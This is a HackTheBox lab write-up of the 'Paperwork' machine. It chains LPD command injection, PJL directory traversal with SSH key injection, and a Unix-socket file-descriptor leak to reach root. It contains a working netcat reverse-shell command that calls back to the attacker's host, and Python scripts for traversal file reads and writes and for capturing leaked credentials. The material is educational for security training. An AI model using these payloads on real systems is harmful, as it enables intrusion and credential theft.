# Paperwork - HackTheBox Writeup

![Badge](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Badge](https://img.shields.io/badge/OS-Linux-red)
![Badge](https://img.shields.io/badge/Points-20-blue)

## Machine Summary

**Paperwork** is an easy-difficulty Linux machine that demonstrates a sophisticated attack chain involving:
- **Command Injection** in LPD (Line Printer Daemon)
- **Directory Traversal / LFI** via PJL (Printer Job Language)
- **SSH Key Injection** for lateral movement
- **Unix Socket File Descriptor Leak** for privilege escalation

The machine showcases how multiple seemingly isolated vulnerabilities can be chained together to achieve complete system compromise, from initial RCE to root access.

---

## Enumeration

### Initial Nmap Scan

```bash
nmap -sS -p- 10.129.65.121
```

**Results:**
- Port 22/tcp: OpenSSH 10.0p2
- Port 80/tcp: nginx 1.28.0 (HTTP)

The SSH redirect suggests a virtual host. Update `/etc/hosts`:
```
10.129.65.121  paperwork.htb
```

### Deep Service Enumeration

```bash
nmap -sVC -p 22,80 -oN deep.txt 10.129.65.121
```

**Key Findings:**
- **Port 80**: nginx 1.28.0 serving "Intake Portal"
- **HTTP Title**: "Corporate Systems: Department of Records & Archives"
- **Service**: LPD (Line Printer Daemon) RFC 1179 compliant
- **Target Queue**: `archive_intake`
- **Internal Processor**: `paperwork-archive-v1.02` (downloadable)

---

## Exploitation

### Phase 1: LPD Command Injection (RCE as `lp`)

#### Vulnerability Analysis

Downloading `paperwork-archive-v1.02` reveals the vulnerable code:

```python
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    
    if queue not in VALID_QUEUE:
        self.sock.send(b'\x01') 
        return
    
    # ... receives job data ...
    
    # VULNERABLE: subprocess.Popen with shell=True
    subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The `job_name` is extracted from the LPD protocol without sanitization, allowing **command injection** via shell metacharacters.

#### Exploit Development

Create `poc.py` - LPD command injection exploit:

```bash
# Download and use the exploit from GitHub
python3 poc.py 10.129.65.121 -q archive_intake -c "mkfifo /tmp/f; nc 10.10.14.155 443 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f"
```

#### Execution

**Terminal 1 - Listener:**
```bash
nc -lvnp 443
```

**Terminal 2 - Exploit:**
```bash
python3 poc.py 10.129.65.121 -q archive_intake -c "mkfifo /tmp/f; nc 10.10.14.155 443 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f"
```

**Result:** Shell as `lp` user

```
listening on [any] 443 ...
connect to [10.10.14.155] from (UNKNOWN) [10.129.65.121] 57830
whoami
lp
```

---

### Phase 2: Lateral Movement via PJL (SSH Access as `archivist`)

#### Port Discovery

```bash
nmap -sVC -p 9001 10.129.65.121
# 9001/tcp closed tor-protocol
```

Internal enumeration from `lp` shell:

```bash
netstat -tlnp 2>/dev/null | grep LISTEN
# 127.0.0.1:9100 - JetDirect/PJL service
```

#### PJL Vulnerability - Directory Traversal

Port 9100 runs a **JetDirect print server** with PJL support. PJL allows:
- Reading files via `@PJL FSUPLOAD` with directory traversal (`../`)
- Writing files via `@PJL FSDOWNLOAD`

#### SSH Key Injection Attack

**Step 1: Generate SSH Key Pair (Kali)**
```bash
ssh-keygen -t rsa -N "" -f ~/paperwork_key
cat ~/paperwork_key.pub
```

**Step 2: Read User Flag via PJL**

```python
import socket

def pjl_read(host, port, filepath):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    cmd = f'@PJL FSUPLOAD NAME="../{filepath}" OFFSET=0 SIZE=999999\n'
    sock.send(cmd.encode())
    
    response = sock.recv(65536)
    sock.close()
    return response.decode(errors='ignore')

# Read user.txt
result = pjl_read('127.0.0.1', 9100, 'user.txt')
print(result)
```

**Step 3: Write SSH Public Key**

```python
import socket

def pjl_write(host, port, filepath, content):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # CRITICAL: NAME before SIZE (server regex requirement)
    cmd = f'@PJL FSDOWNLOAD NAME="../../{filepath}" SIZE={len(content)}\n'
    sock.send(cmd.encode())
    sock.send(content.encode())
    
    response = sock.recv(4096)
    sock.close()
    return response

pub_key = "ssh-rsa AAAA... (your key)"
result = pjl_write('127.0.0.1', 9100, '/home/archivist/.ssh/authorized_keys', pub_key)
print("Result:", result)
```

**Step 4: SSH as archivist (from Kali)**

```bash
ssh -i ~/paperwork_key archivist@10.129.65.121
whoami
# archivist
cat /home/archivist/user.txt
# [USER_FLAG]
```

---

### Phase 3: Privilege Escalation via Socket FD Leak

#### Socket Discovery

```bash
ls -la /run/paperwork/
# srw-rw---- 1 root archivist /run/paperwork/mgmt.sock
```

The **management socket** is:
- Owned by root
- Writable by archivist
- Exposes file descriptors when triggered

#### Vulnerability: Security Violation Detection

The daemon monitors PJL commands on port 9100. When it detects suspicious activity (e.g., `@PJL FSUPLOAD`), it triggers a **FORENSIC_CONTEXT** response, exposing its open file descriptors via `SCM_RIGHTS`.

#### Exploitation

**Step 1: Trigger Security Violation**

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 9100))

# Send PJL command that triggers alert
sock.send(b'@PJL FSUPLOAD NAME="../user.txt" OFFSET=0 SIZE=999999\n')
sock.close()
print("[+] PJL command sent - triggering SECURITY_VIOLATION")
```

**Step 2: Receive File Descriptors**

Execute immediately after (within 1 second):

```python
#!/usr/bin/env python3
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
maxfds = 10

# Receive ancillary data (file descriptors)
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(maxfds * fds.itemsize))

print("MSG:", msg)

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])

print("FDs recibidos:", list(fds))

for fd in fds:
    try:
        data = os.pread(fd, 4096, 0)
        print(f"--- fd {fd} ---")
        print(data.decode(errors="ignore"))
    except Exception as e:
        print(f"fd {fd} error: {e}")

s.close()
```

#### Output

```
MSG: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
FDs recibidos: [4, 5]

--- fd 4 ---
[127.0.0.1] connected
Command: @PJL FSUPLOAD NAME="../user.txt" OFFSET=0 SIZE=999999

--- fd 5 ---
ADMIN_PASSWORD=*****************
```

#### Privilege Escalation to Root

```bash
su - root
# Password: *************

whoami
# root

cat /root/root.txt
# [ROOT_FLAG]
```

---

## Attack Chain Summary

```
┌─────────────────────────────────────────┐
│ 1. LPD Command Injection (Port 1515)   │
│    → RCE as 'lp' user                  │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ 2. PJL Directory Traversal (Port 9100) │
│    → Read/Write files as 'archivist'   │
│    → SSH key injection                  │
│    → SSH access without password        │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ 3. Unix Socket FD Leak                 │
│    → Trigger security violation        │
│    → Receive admin credentials via FD  │
│    → su - root with leaked password    │
└─────────────────────────────────────────┘
```

---

## Key Takeaways

1. **LPD Protocol Vulnerabilities**: Always sanitize inputs when passing user data to shell commands
2. **PJL Security**: Directory traversal in printer protocols can expose sensitive files
3. **File Descriptor Leaks**: SCM_RIGHTS can expose privileged file descriptors when privilege contexts change
4. **Chaining Vulnerabilities**: Multiple independent vulnerabilities create a complete attack path

---

## Tools Used

- `nmap` - Network reconnaissance
- `nc` - Netcat (reverse shells)
- Python3 with `socket` module
- SSH utilities
- Standard Unix tools (`su`, `whoami`, `cat`)

---

## References

- [RFC 1179 - Line Printer Daemon Protocol](https://tools.ietf.org/html/rfc1179)
- [HP PJL Reference Manual](https://www.manualslib.com/manual/356318-Hp-Laserjet-Pro-Mfp-M428dw.html)
- [Unix Socket and SCM_RIGHTS Documentation](https://man7.org/linux/man-pages/man7/unix.7.html)

---


*Writeup by: Darkstinx*  
*Date: August 2, 2026*
